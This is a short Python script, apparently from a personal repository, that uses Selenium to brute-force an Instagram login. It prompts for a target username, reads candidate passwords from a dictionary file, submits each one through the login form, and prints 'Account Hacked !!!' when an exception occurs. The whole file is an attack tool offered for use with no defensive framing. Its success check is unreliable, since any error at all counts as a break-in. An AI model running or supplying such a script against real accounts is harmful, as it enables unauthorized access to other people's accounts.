#/
#    author:   abhijayrajvansh
#    created:  30.01.2022 02:29:16
#/
from codecs import backslashreplace_errors
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options #to by-pass chrome broswer notification
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import os
import time

pwd = os.getcwd()
PATH = Service(pwd + "/chromedriver")
url = "http://www.instagram.com"

# Handling Chrome Options:
chromeOptions = Options()
chromeOptions.add_argument("--disable-extensions")
chromeOptions.add_argument("--disable-notifications")

# Reading passwords from distionary
dictionary = []
with open('dictionary.txt', 'r') as file:
    for words in file:
        words = words.strip()
        dictionary.append(words)

# driver setup: Launching instagram
driver = webdriver.Chrome(service = PATH, options = chromeOptions)
driver.get(url) 
time.sleep(1)

#target details:
username = input('Enter Username: ')
driver.find_element(By.XPATH, "//input[@name='username']").send_keys(username)

def bruteforce (i):
    print("Trying Password : " + str(i) + " | - " + dictionary[i])
    driver.find_element(By.XPATH, "//input[@name='password']").send_keys(dictionary[i])
    driver.find_element(By.XPATH, "//div[contains(text(),'Log In')]").click()
    time.sleep(3)
    driver.find_element(By.XPATH, "//input[@name='password']").send_keys(Keys.COMMAND + "a")
    driver.find_element(By.XPATH, "//input[@name='password']").send_keys(Keys.BACKSPACE)
    time.sleep(2)

i = 0
while True:
    try:
        bruteforce(i)
        i += 1
    except Exception as e:
        print("Account Hacked !!!")
        print("----------------------------------------------------------------------------------------\n\n")
        break
